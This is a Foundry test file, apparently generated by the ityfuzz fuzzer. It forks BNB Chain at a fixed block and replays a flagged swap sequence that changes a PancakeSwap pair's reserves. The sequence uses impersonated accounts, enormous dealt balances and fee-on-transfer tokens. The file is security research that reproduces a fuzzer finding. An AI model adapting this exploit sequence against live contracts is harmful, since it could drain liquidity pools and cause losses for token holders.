// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5,0x55d398326f99059fF775485246999027B3197955,0x7EFaEf62fDdCCa950418312c6C91Aef321375A00,0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e -c bsc --onchain-block-number 28466976 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x6bc2823de2c3718d3669c2e7036e1d888c4107a1, Reserves changed from (0x0000000000000000000000000000000000000000000254cbab856720cbe86720_U256, 0x000000000000000000000000000000000000000000017776045e3d01f24811ec_U256) to (0x0000000000000000000000000000000000000000000254d2e0611b6265b135ce_U256, 0x000000000000000000000000000000000000000000017776045e3d01f24811ec_U256)

================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] Router.swapExactETHForTokens{value: 79199148313.2432 Ether}(0, path:(WETH → 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00), address(this), block.timestamp);
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] Router.swapExactETHForTokens{value: 11214979427901.5118 Ether}(0, path:(WETH → 0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e), address(this), block.timestamp);
   ├─[1] 0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e.transfer(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 4308)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e → WETH), address(this), block.timestamp);


 */

contract C382e is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 28466976);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 79199148313024324995788570624);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 79199148313024324995788570624
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        address[] memory path1 = new address[](2);
        path1[0] = weth;
        path1[1] = 0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 11214979427901511881476715416973);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 11214979427901511881476715416973
        }(0, path1, address(this), block.timestamp);
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e).transfer(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 4308);
        
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e).balanceOf(address(this));
        IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
